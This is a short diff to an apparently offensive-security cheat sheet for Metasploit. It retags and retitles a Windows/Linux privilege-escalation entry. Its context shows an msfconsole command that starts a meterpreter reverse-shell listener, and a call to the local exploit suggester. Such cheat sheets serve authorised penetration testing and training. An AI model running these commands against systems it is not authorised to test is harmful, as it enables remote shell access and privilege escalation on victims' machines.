@@ -16,5 +16,6 @@ search <search>
 # Setup Windows meterpreter shell listener
 msfconsole -x "use exploit/multi/handler;set LHOST <listener-ip>;set LPORT <listener-port>;set payload windows/meterpreter/reverse_tcp;run"
 
-# [INSIDE METASPLOIT] Meterpreter Shell - LPE
+% linux, windows, msfconsole, metasploit, privesc
+# [INSIDE METASPLOIT] Meterpreter Shell - LPE for Windows and Linux
 run post/multi/recon/local_exploit_suggester
